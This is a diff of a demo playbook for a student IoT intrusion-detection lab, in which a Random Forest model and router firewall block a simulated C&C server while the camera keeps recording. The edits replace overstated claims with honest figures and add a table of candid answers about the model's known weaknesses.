+		elements = { 10.10.10.50 timeout 30m expires 28m19s240ms }
 ```
+- `10.10.10.50` (C&C server) is blocked; the camera `192.168.50.30` is not in any set, and the NVR keeps recording (`docker logs ids-lab-nvr --tail 1`).
 
-##### 📊 Output Breakdown:
-- `elements = { 10.10.10.50 timeout 30m expires 29m58s }`: Shows C&C Server IP (`10.10.10.50`) added to kernel drop set, with auto-expiry timer counting down second by second.
-- Camera IP (`192.168.50.30`) is completely unblocked, allowing continuous video streaming from camera to NVR without disruption!
-
-#### 🖥️ Dashboard Live UI Demonstration:
-1. **Live Alerts Page (`http://localhost:5000/alerts`):**
-   - Show purple **`CnC`** (Confidence 98.89%) alert badge and Auto-Mitigation Action recorded as `DROP (block_dst)`.
-2. **Blocklist / Mitigations Page (`http://localhost:5000/mitigations`):**
-   - Show **Blocked IP:** `10.10.10.50` (C&C Server) active in list.
-   - Show **TTL Countdown:** 30-minute timer counting down second by second live in browser.
-   - **Camera Protection:** Show camera IP (`192.168.50.30`) is absent from this blocklist, confirming normal video data flow is completely undisturbed.
+#### 🖥️ Dashboard:
+1. **Live Alerts:** **CnC** card (purple), `192.168.50.30 → 10.10.10.50:6667`, response **blocked**.
+2. **Blocklist:** `10.10.10.50`, reason `AUTO_CNC_DEST_BLOCK`, **EXPIRES AT** about 30 minutes later, **UNBLOCK** button.
 
 > 🎯 **Final Evidence for the Supervisor:**  
-> *"Sir, look at the terminal! The instant our infected camera sent the C&C beacon, our Zeek sensor sniffed the flow, our Random Forest model classified it, our decision engine evaluated the safety invariants, and our router firewall autonomously injected '10.10.10.50' into kernel memory with a 30-minute auto-expiry countdown—all completed in just 112 milliseconds!"*
+> *"Sir, the camera kept trying to reach an outside C&C server. Zeek recorded each try, the model classed them as C&C, and after three such alerts within a minute the policy blocked the outside address in the router kernel for 30 minutes. The camera itself was not blocked, so its video to the NVR never stopped. On 13 November this took about 25 to 30 seconds from the first try; once the policy decided, the router rule took a fraction of a second."*
+
+#### After the playbook:
+Wait 30 seconds after the last C&C try (see Test 2.4), then:
+```powershell
+.venv\Scripts\python.exe lab_virtual\lab.py reset
+```
 
 ---
 
-### 🎓 Closing Statement for the Supervisor Presentation:
-> *"Sir, as demonstrated in our presentation today, our implementation satisfies all 8 Functional Requirements (FR-01 to FR-08), achieves our Proposal Table 9 benchmarks with an empirical decision latency of 112 ms, meets our Macro-F1 target on held-out data, and enforces strict safety invariants that protect IP camera streams from interruption. The entire virtual testbed is live, validated, and ready for physical camera deployment."*
+# 8. Part 7: Questions the Supervisor May Ask
+
+| Question | Short honest answer |
+| :--- | :--- |
+| "Is 34-1 really unseen?" | No. It was opened and studied during development (model card section 6, D-054). The clean test is the hardware lab. |
+| "Why is the confidence for DDoS only about 0.45?" | The live flood looks different from IoT-23 floods (14 shifted features). It is still the top class of the five, and the DDoS rate-limit threshold (0.30) was chosen from training data only, before the lab test. |
+| "Why did the flood also cause a C&C block?" | Many failed connections from one source to one address can look like C&C (issue 43). We record it and will check it in the hardware lab. |
+| "Why does a single-host scan not give PortScan?" | Too few flows for the 60-second window features (issues 38, 46). A subnet sweep gives PortScan. |
+| "Why do you restart the backend before the demo?" | The window features remember the last hour of each source. After many rehearsals from the same attacker address, a scan looked like C&C (it has many earlier failed tries). This is the same weakness as issue 43; the restart starts the memory empty, like a new attacker. In the hardware lab we will record how often this happens with real traffic. |
+| "Is the model calibrated?" | Step 17a compared methods by a rule written first; it chose no calibration (raw Random Forest probabilities, D-044/D-045). |
+| "Is Random Forest the best model?" | On the same rows, HistGradientBoosting has a slightly higher out-of-fold macro-F1 (0.7391 vs 0.7097, issue 49). We keep Random Forest as planned in the proposal and report both. |
+| "Does Zeek lose packets?" | No: `stats.log` shows 0 dropped and `capture_loss.log` 0.0%. Earlier the capture loss was about 98% because Zeek cut the large joined packets of the virtual network at 9,216 bytes; fixed with a larger snap length (D-058). We will measure again on the real sensor. |
+| "Can the camera be blocked by mistake?" | Not automatically (camera-LAN protection). A manual block by an admin is accepted today (issue 52); we would like your advice: refuse it, or ask for confirmation. |
+| "Could the camera's normal cloud retries look like C&C?" | Possibly (issue 39), because C&C is blocked at 0.30. We test this with a cloud outage in the hardware lab before automatic response is used there. |
+| "What is still left?" | Hardware lab (Step 5), real camera capture and FPR (Step 20), Zeek on the real sensor (Steps 19, 22), the 6 scenarios, FR, speed, reliability and usability tests in the hardware lab (Steps 35–39), and the final report (Steps 40–42). |
+
+---
+
+### 🎓 Closing Statement:
+> *"Sir, to summarise: all eight functional requirements are built and work on real packets in our virtual lab. The model meets the 0.85 macro-F1 number on the classes present in the held-out scenario, with the warning that this scenario is no longer a clean test. The system time from Zeek to the dashboard is well inside the latency target, and the camera, NVR and admin PC were never blocked in any test. The remaining step is the hardware lab with a real camera, where we will measure the benign false-positive rate, repeat the six scenarios, and test reliability and usability. That will decide our hypothesis H1."*
